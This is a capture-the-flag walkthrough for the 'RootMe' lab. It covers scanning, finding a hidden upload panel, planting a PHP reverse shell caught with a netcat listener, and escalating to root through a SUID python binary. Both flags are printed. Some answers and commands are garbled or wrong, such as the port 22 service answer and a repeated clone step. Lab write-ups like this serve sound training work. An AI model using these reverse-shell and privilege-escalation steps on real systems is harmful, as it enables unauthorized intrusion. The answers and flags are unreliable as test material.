# RootMe1
![root](https://user-images.githubusercontent.com/32848915/196031503-cb04f77b-c55a-4296-8bf2-9f24b0b1196f.PNG)

🔴️Task 2:
	⚠️Scan the machine, how many ports are open?
		nmap -sC -sV -oN 10.10.188.190
			==> answer : 2
			
	⚠️What version of Apache is running?
		==> answer : 2.4.29
		
	⚠️What service is running on port 22?
		==> answer : 22
		
	⚠️What is the hidden directory??
		obuster dir -u http://10.10.188.190  -w /usr/share/dirbuster/wordlists directory-list-2.3-medium.txt
		==> answer : /panel/
		

🔴️Task 3: Getting a shell
	⚠️Find a form to upload and get a reverse shell, and find the flag.
		step1:
			git clone https://github.com/pentestmonkey/php-reverse-shell.git
			chmod +x *
			
		step2:
			git clone https://github.com/pentestmonkey/php-reverse-shell.git
			mv php-reverse-shell.php php_reverse_shell.phtml
			
		nc -lvnp 4444
			$ whoami
			?www-data
			cd /var/www
			cat user.txt
				THM{y0u_g0t_a_sh3ll}
	
🔴️Task4 : Privilege escalation
	⚠️ Search for files with SUID permission, which file is weird?
		find / -perm -u=s -type f 2>/dev/null
			/usr/bin/python
			
	⚠️ Find a form to escalate your privileges:
		
	
	⚠️ root.txt
		/usr/bin/python -c 'print(open("/root/root.txt").read())'
    		cat /root/root.txt
			==> THM{pr1v1l3g3_3sc4l4t10n}
    
    
   
  
